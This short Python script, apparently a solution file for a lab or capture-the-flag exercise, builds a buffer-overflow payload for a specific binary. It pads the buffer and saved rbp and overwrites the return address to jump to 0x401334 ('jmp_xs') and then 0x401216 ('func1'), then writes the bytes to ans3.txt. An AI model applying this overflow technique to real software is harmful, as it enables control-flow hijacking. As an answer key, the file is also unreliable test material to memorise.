# ans3.py
payload = (
    b"A" * 32 +                     # 0x20 字节缓冲区 + 可能的对齐
    b"B" * 8 +                      # saved rbp，随便填
    b"\x34\x13\x40\x00\x00\x00\x00\x00" +   # 返回地址 → 0x401334 (jmp_xs) 小端序
    b"\x16\x12\x40\x00\x00\x00\x00\x00"     # 下一个 8 字节 → 0x401216 (func1)
    # 可以再加 b"C"*8 凑满 64 字节也可以，不影响
)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("已生成 ans3.txt，大小:", len(payload), "字节")